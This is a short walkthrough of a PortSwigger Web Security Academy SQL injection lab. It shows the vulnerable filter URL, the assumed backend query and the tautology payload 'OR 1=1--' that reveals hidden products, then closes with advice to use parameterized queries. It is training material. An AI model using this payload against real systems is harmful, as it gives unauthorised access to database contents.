# PortSwigger SQL Injection — WHERE Clause Hidden Data

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: Apprentice
- Goal: retrieve hidden products
- Result: solved

## Summary

The lab has a vulnerable product category filter:

```text
/filter?category=Corporate+gifts
```

The backend likely appends the category into a `WHERE` clause that also filters unreleased products:

```sql
SELECT * FROM products WHERE category = '<category>' AND released = 1
```

By injecting a tautology and commenting out the rest of the predicate, the query returns all products, including hidden ones.

## Payload

```text
Corporate gifts' OR 1=1--
```

Resulting logic:

```sql
WHERE category = 'Corporate gifts' OR 1=1--' AND released = 1
```

The `OR 1=1` condition matches every row, and the comment removes the `released = 1` restriction.

## Verification

The filtered page displayed the full product list, including hidden/unreleased items. Reloading the lab homepage showed the solved marker.

## Defensive takeaway

Use parameterized queries for category filters. If a category must come from a fixed set, enforce an allowlist as a second layer, but do not rely on allowlisting as a substitute for query parameterization.